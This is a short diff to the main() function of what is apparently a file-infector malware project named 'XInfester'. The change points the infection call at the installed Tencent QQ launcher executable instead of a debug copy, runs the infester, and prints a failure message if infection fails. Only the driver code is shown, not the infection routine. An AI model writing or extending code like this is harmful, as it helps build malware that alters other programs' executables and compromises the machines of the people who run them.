@@ -2,5 +2,10 @@
 
 int main()
 {
-	XInfester_InfestFile("E:\\debug\\QQScLauncher.exe");
+	XInfester_Run();
+	if(!XInfester_InfestFile("D:\\Program Files\\Tencent\\QQ\\Bin\\QQScLauncher.exe"))
+		printf("infect failed\n");
+	
+	printf("Xinfester Hello World.\n");
+	getchar();
 }
